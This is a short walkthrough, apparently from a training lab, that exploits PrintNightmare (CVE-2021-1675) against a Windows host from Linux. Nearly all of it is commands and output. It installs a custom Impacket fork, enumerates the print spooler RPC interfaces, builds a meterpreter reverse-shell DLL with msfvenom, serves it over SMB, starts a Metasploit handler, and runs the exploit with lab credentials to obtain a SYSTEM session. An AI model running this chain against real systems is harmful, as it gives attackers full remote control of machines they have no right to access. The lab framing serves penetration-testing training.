# PrintNightmare from Linux

## Custom Impacket Installation

```sh
my@attack:~$ sudo pip3 uninstall -y impacket
my@attack:~$ sudo git clone https://github.com/cube0x0/impacket.git
my@attack:~$ sudo cd impacket
my@attack:~/impacket$ sudo python3 setup.py install
```

## Enumeration

```sh
my@attack:~$ rpcdump.py @10.129.43.13 | grep 'MS-PAR\|MS-RPRN'
```

```output title="Output"
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

## Creating the Payload

```sh
my@attack:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.164 LPORT=9001 -f dll -o /tmp/malicious.dll
```

## Share

```sh
my@attack:~$ sudo smbserver.py -smb2support share /tmp
```

## Metasploit

```text title="handler.rc" linenums="1"
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.164
set LPORT 9001
run
```

```sh
my@attack:~$ msfconsole -q -r handler.rc
```

```output title="Output"
[*] Started reverse TCP handler on 10.10.14.164:9001
```

## Exploitation

```sh
my@attack:~$ git clone https://github.com/cube0x0/CVE-2021-1675.git
my@attack:~$ cd CVE-2021-1675
my@attack:~/CVE-2021-1675$ python3 CVE-2021-1675.py 'INLANEFREIGHT.LOCAL'/'htb-student':'HTB_@cademy_stdnt!'@10.129.43.13 "\\\\10.10.14.164\\share\\malicious.dll"
```

```output title="Output"
[*] Connecting to ncacn_np:10.129.43.13[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_ce3301b66255a0fb\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.164\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
```

## Meterpreter Session Established

```sh
meterpreter > getuid
```

```output title="Output"
Server username: NT AUTHORITY\SYSTEM
```
